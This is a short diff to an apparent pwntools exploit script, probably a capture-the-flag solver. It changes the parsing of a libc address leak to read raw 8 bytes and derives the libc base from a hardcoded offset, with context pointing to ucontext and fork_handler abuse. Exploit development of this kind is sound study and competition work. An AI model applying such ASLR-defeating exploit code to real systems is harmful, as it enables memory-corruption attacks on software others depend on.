@@ -83,11 +83,10 @@ def build_ucontext(rsp, rip, rdi=0, rsi=0, rdx=0):
 
 
 io.recvuntil(b"gift: ")
-leak_line = io.recvline().strip()
-stdin_leak = int(leak_line, 16)
-log.success(f"stdin leak: {hex(stdin_leak)}")
-
-libc.address = stdin_leak - libc.sym["_IO_2_1_stdin_"]
+leak = u64(io.recvn(8))
+log.success(f"leak: {hex(leak)}")
+# fflush(NULL) cleanup buffer q[0] = libc_base + 0x8f1e0
+libc.address = leak - 0x8F1E0
 log.success(f"libc base: {hex(libc.address)}")
 
 # After my local tests, following are the addresses of fork_handlers in different glibc versions.
